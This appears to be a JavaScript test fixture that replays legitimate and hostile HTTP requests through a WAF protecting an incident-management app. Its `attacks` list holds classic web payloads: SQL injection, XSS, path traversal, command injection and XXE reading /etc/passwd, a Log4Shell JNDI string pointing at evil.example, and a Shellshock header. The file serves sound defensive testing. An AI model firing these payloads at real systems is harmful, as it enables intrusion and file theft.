// Requests replayed through a WAF in front of OpsKnight. `legit` must pass; `attacks` must be stopped
// (blocked by the WAF, or inert in the app: the WAF blocking them is the expectation checked here).
// Shapes come from docs/v2.3.0/operate/deploy/waf-compatibility.md and real provider payloads.

const rnd = (length, alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_') => {
  let state = 7;
  let out = '';
  for (let i = 0; i < length; i += 1) {
    state = (Math.imul(state, 1103515245) + 12345) >>> 0;
    out += alphabet[state % alphabet.length];
  }
  return out;
};
const json = body => ({ headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) });
const form = fields => ({
  headers: { 'content-type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams(fields).toString(),
});
const tenant = '72f988bf-86f1-41af-91ab-2d7cd011db47';
const state = encodeURIComponent(JSON.stringify(['', ['children', '(app)', ['children', 'incidents']]]));

export const legit = [
  {
    name: 'OIDC callback with a 1,200 character authorization code and an iss URL',
    method: 'GET',
    path: `/api/auth/callback/oidc?code=${rnd(1200)}&state=${rnd(43)}&session_state=${rnd(36)}&iss=${encodeURIComponent(`https://login.microsoftonline.com/${tenant}/v2.0`)}`,
  },
  {
    name: 'OIDC callback error with quotes and URLs in error_description',
    method: 'GET',
    path: `/api/auth/callback/oidc?error=access_denied&error_description=${encodeURIComponent("AADSTS65001: The user or administrator has not consented to use the application with ID 'a1b2'. Send an interactive authorization request for this user and resource. https://login.microsoftonline.com/error?code=65001")}&state=${rnd(43)}`,
  },
  {
    name: 'Login deep link with the original query string in callbackUrl',
    method: 'GET',
    path: `/login?callbackUrl=${encodeURIComponent('http://app.example.com/incidents?status=open&q=disk usage > 90%')}`,
  },
  {
    name: 'SSO button post with the NextAuth cookies',
    method: 'POST',
    path: '/api/auth/signin/oidc',
    headers: {
      cookie: `next-auth.csrf-token=${rnd(64)}%7C${rnd(64)}; next-auth.callback-url=${encodeURIComponent('http://app.example.com/incidents?status=open')}`,
    },
    ...form({ csrfToken: rnd(64), callbackUrl: '/incidents?status=open', json: 'true' }),
  },
  {
    name: 'SSO settings JSON with issuer URL, client secret and role mapping rules',
    method: 'POST',
    path: '/api/auth/control',
    ...json({
      configuration: {
        issuer: `https://login.microsoftonline.com/${tenant}/v2.0`,
        clientId: tenant,
        clientSecret: "gT8~Q-x.p_9'Zk(w)+3!;UrB<5>dL=a&6{s}[j]",
        scopes: 'openid profile email',
        roleMappings: Array.from({ length: 40 }, (_, i) => ({ claim: 'groups', value: `grp-${i}`, role: 'RESPONDER' })),
      },
    }),
  },
  {
    name: 'Page navigation with RSC and Next-Router-State-Tree headers',
    method: 'GET',
    path: '/incidents?status=open',
    headers: { rsc: '1', 'next-router-state-tree': state, 'next-url': '/incidents' },
  },
  {
    name: 'Server Action saving a runbook step with shell, Docker and kubectl commands',
    method: 'POST',
    path: '/runbooks/rb_123/edit',
    headers: { 'next-action': rnd(40, 'abcdef0123456789'), 'next-router-state-tree': state },
    ...json([
      {
        title: 'Restart the API',
        steps: [
          'kubectl rollout restart deploy/api -n prod && kubectl rollout status deploy/api -n prod',
          'docker exec -it api sh -c "cat /etc/passwd | head -3; rm -rf /tmp/cache/*"',
          'curl -s http://10.0.0.5:9090/-/healthy | grep -i ok || (echo down; exit 1)',
        ],
      },
    ]),
  },
  {
    name: 'Runbook Agent result with command output',
    method: 'POST',
    path: '/api/runbook-agent/v1/results',
    headers: { 'user-agent': 'OpsKnight-Agent/2.3.0' },
    ...json({
      runId: 'run_1',
      stepId: 'step_1',
      exitCode: 0,
      output: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nERROR: select * from users where id=\'1\' failed\n<html><body>502 Bad Gateway</body></html>',
    }),
  },
  {
    name: 'Alert with an internal URL, SQL and HTML in its text',
    method: 'POST',
    path: '/api/events',
    headers: { authorization: 'Token token=abc123' },
    ...json({
      event_action: 'trigger',
      dedup_key: 'db-pool',
      payload: {
        summary: "SQL error: SELECT * FROM users WHERE id='1' OR '1'='1' returned 0 rows <b>pool</b> exhausted",
        source: 'prometheus',
        severity: 'critical',
        custom_details: { generatorURL: 'http://10.0.0.5:9090/graph?g0.expr=up%7Bjob%3D%22api%22%7D', stack: 'at Object.<anonymous> (/srv/app/index.js:10:3)\nat Module._compile (node:internal/modules/cjs/loader:1256:14)' },
      },
    }),
  },
  {
    name: 'Grafana alerting webhook',
    method: 'POST',
    path: '/api/integrations/grafana',
    headers: { 'user-agent': 'Grafana' },
    ...json({
      receiver: 'opsknight',
      status: 'firing',
      alerts: [
        {
          status: 'firing',
          labels: { alertname: 'HighLatency', service: 'checkout', severity: 'critical' },
          annotations: { summary: 'p99 > 2s on https://checkout.internal:8443/health?probe=1', runbook_url: 'http://wiki.internal/runbooks/latency' },
          generatorURL: 'http://grafana.internal:3000/alerting/grafana/abc/view?orgId=1',
          fingerprint: 'abc123',
        },
      ],
      title: '[FIRING:1] HighLatency',
      message: '**Firing**\n\nValue: A=2.4\nLabels: alertname=HighLatency',
    }),
  },
  {
    name: 'Alert body of about 900 KB',
    method: 'POST',
    path: '/api/events',
    headers: { authorization: 'Token token=abc123' },
    ...json({
      event_action: 'trigger',
      dedup_key: 'big',
      payload: { summary: 'Large payload', source: 'custom', severity: 'warning', custom_details: { log: Array.from({ length: 9000 }, (_, i) => `2026-06-01T12:00:${String(i % 60).padStart(2, '0')}Z INFO checkout request completed in ${i % 900}ms status=200 path=/api/orders/${i} region=eu-west-1`).join('\n') } },
    }),
  },
  {
    name: 'Status page branding with custom CSS and a base64 logo',
    method: 'PUT',
    path: '/api/settings/status-page',
    ...json({
      customCss: 'body { background: url("data:image/png;base64,iVBOR") } .hero > h1:hover::after { content: "\\201C"; }',
      logo: `data:image/png;base64,${rnd(6000, 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/')}==`,
    }),
  },
  {
    name: 'Incident note with a pasted stack trace and SQL error',
    method: 'POST',
    path: '/incidents/inc_1',
    headers: { 'next-action': rnd(40, 'abcdef0123456789') },
    ...json([
      'inc_1',
      "Root cause: ERROR 1064 (42000): You have an error in your SQL syntax near 'DROP TABLE' at line 1\nTypeError: Cannot read properties of undefined (reading 'map')\n    at render (/app/.next/server/chunks/42.js:1:2034)\n<div class=\"x\">",
    ]),
  },
  {
    name: 'Squire question with a pasted log excerpt',
    method: 'POST',
    path: '/api/intelligence/squire',
    ...json({
      message: 'Why did checkout fail? Log: [2026-06-01 12:00:01] ERROR db: SELECT count(*) FROM orders WHERE status = \'pending\' timed out after 30s; see http://10.1.2.3:5432 ; <timeout> exceeded',
      incidentId: 'inc_1',
    }),
  },
  {
    name: 'MCP OAuth token request with a PKCE verifier and a loopback redirect_uri',
    method: 'POST',
    path: '/oauth/mcp/token',
    ...form({ grant_type: 'authorization_code', code: rnd(64), code_verifier: rnd(128), redirect_uri: 'http://127.0.0.1:33418/callback', client_id: 'mcp_client' }),
  },
  {
    name: 'MCP OAuth authorize with a loopback redirect_uri',
    method: 'GET',
    path: `/oauth/mcp/authorize?response_type=code&client_id=mcp_client&redirect_uri=${encodeURIComponent('http://127.0.0.1:33418/callback')}&code_challenge=${rnd(43)}&code_challenge_method=S256&state=${rnd(22)}&resource=${encodeURIComponent('https://opsknight.example.com/mcp')}`,
  },
  {
    name: 'MCP OAuth dynamic client registration with loopback redirect URIs',
    method: 'POST',
    path: '/oauth/mcp/register',
    ...json({ client_name: 'Claude Code', redirect_uris: ['http://127.0.0.1:33418/callback', 'http://localhost:8080/cb', 'http://[::1]:9000/cb'], grant_types: ['authorization_code', 'refresh_token'], token_endpoint_auth_method: 'none' }),
  },
  {
    name: 'MCP JSON-RPC tool call',
    method: 'POST',
    path: '/mcp',
    headers: { authorization: 'Bearer ok_abc', accept: 'application/json, text/event-stream' },
    ...json({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'searchIncidents', arguments: { query: 'status:open AND service:"checkout"' } } }),
  },
  {
    name: 'Slack interactive payload',
    method: 'POST',
    path: '/api/slack/interactions',
    headers: { 'user-agent': 'Slackbot 1.0 (+https://api.slack.com/robots)', 'x-slack-signature': `v0=${rnd(64, 'abcdef0123456789')}`, 'x-slack-request-timestamp': '1790000000' },
    ...form({ payload: JSON.stringify({ type: 'block_actions', user: { id: 'U1', username: 'sam' }, actions: [{ action_id: 'ack', value: 'inc_1' }], response_url: 'https://hooks.slack.com/actions/T1/2/abc' }) }),
  },
  {
    name: 'GitHub webhook',
    method: 'POST',
    path: '/api/integrations/github',
    headers: { 'user-agent': 'GitHub-Hookshot/abc', 'x-github-event': 'workflow_run', 'x-hub-signature-256': `sha256=${rnd(64, 'abcdef0123456789')}` },
    ...json({ action: 'completed', workflow_run: { name: 'CI', conclusion: 'failure', html_url: 'https://github.com/acme/api/actions/runs/1', head_commit: { message: "fix: don't drop the 'orders' table; see #12" } } }),
  },
  { name: 'Global search', method: 'GET', path: '/api/search?q=checkout%20timeout' },
  { name: 'Status page subscription', method: 'POST', path: '/api/status/subscriptions', ...json({ email: 'user+tag@example.com', componentIds: ['c1', 'c2'] }) },
];

export const attacks = [
  { name: 'SQL injection in a query argument', method: 'GET', path: '/api/search?q=%27%20OR%201%3D1--' },
  { name: 'UNION SELECT in a query argument', method: 'GET', path: '/api/search?q=1%20UNION%20SELECT%20username,password%20FROM%20users' },
  { name: 'Reflected XSS in a query argument', method: 'GET', path: '/login?next=%3Cscript%3Ealert(1)%3C/script%3E' },
  { name: 'Path traversal', method: 'GET', path: '/api/files?name=../../../../etc/passwd' },
  { name: 'Command injection in a query argument', method: 'GET', path: '/api/search?q=%3Bcat%20/etc/passwd' },
  { name: 'Log4Shell JNDI string', method: 'GET', path: '/api/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D' },
  { name: 'SSTI probe', method: 'GET', path: '/api/search?q=%7B%7B7*7%7D%7D' },
  { name: 'XXE in an XML body', method: 'POST', path: '/api/integrations/custom', headers: { 'content-type': 'application/xml' }, body: '<?xml version="1.0"?><!DOCTYPE d [<!ENTITY x SYSTEM "file:///etc/passwd">]><d>&x;</d>' },
  { name: 'Scanner user agent', method: 'GET', path: '/', headers: { 'user-agent': 'sqlmap/1.7' } },
  { name: 'Shell metacharacters in a header', method: 'GET', path: '/', headers: { 'x-forwarded-host': '() { :;}; /bin/cat /etc/passwd' } },
];
